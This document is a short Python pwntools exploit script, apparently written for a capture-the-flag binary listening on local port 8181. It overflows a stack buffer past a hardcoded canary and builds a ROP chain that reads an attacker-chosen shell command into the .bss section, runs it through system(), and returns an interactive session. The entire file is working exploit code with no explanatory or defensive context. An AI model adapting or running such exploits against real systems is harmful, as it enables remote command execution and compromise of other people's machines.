from pwn import *
import sys

canary = 0x3dd98f00
popret = 0x8048589
pop4ret = 0x8048eec
pop3ret = 0x8048b83
pop2ret = 0x8048b84

recv_plt = 0x080486E0
system_plt = 0x08048620
bss = 0x0804B1C4
cmd = sys.argv[1] + " >&4\x00"

payload = "A"*0x28
payload += p32(canary)		# canary
payload += "B"*12
payload += p32(recv_plt)	# ROP
payload += p32(pop4ret)
payload += p32(4)
payload += p32(bss)
payload += p32(len(cmd))
payload += p32(0)
payload += p32(system_plt)
payload += 'aaaa'
payload += p32(bss)

s = connect("0", 8181)
s.recv()
s.sendline("1")
s.recv()
s.sendline(payload)
s.recv()
s.sendline("3")			# exploit
s.sendline(cmd)
s.interactive()
